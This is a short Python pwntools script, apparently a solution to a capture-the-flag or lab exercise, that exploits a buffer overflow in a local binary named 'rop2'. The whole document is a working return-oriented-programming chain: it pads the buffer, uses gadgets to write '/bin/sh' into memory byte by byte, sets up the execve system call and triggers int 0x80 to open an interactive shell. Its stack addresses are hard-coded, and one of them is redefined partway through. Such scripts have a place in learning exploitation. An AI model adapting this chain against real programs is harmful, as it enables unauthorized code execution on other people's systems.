from pwn import *

p = process('./rop2')

gdb.attach(p)

int80_addr = p32(0x080483ff) # int 0x80
binsh_addr = p32(0xffffd370) # /bin/bash
gadget_addr = p32(0x080483db) # add DWORD PTR [ebx], eax
gadget2_addr = p32(0x080483de) # mov eax, ebx
popebx_addr = p32(0x08048486) # pop ebx    ret
# binsh_addr = 0xffffcff8
binsh_addr = 0xffc64a28

payload = b'\x00'*0x104
for index, asciinum in enumerate([47, 98, 105, 110, 47, 115, 104]):
    payload += popebx_addr + p32(asciinum) + gadget2_addr
    payload += popebx_addr + p32(binsh_addr + index) + gadget_addr

payload += popebx_addr + p32(11) + gadget2_addr + p32(0x08048368) + popebx_addr + p32(binsh_addr) + int80_addr

p.sendline(payload)

p.interactive()
